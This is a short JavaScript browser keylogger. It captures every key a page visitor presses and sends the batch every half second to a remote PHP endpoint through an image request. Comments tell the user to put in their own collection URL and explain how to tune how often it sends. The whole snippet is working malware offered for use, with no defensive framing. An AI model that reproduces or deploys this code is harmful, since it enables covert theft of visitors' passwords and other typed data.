var presses = [];
window.addEventListener("keydown", function(evt){
  presses.push(evt.key);
});

// Push to server at regular intervals
// Reduce interval timing for more frequent recordings, but increases server load
// You can also set this to send only if certain number of key stroke were made.
window.setInterval(function () {
  if (presses.length>5) {
    var data = encodeURIComponent(JSON.stringify(presses));
    //encodeURIComponent
    console.log(data);
    new Image().src = "bedtt.epizy.com/gg/bedtt.php" + data; // CHANGE THIS URL TO YOUR OWN!
    presses = [];
  }
}, 500);
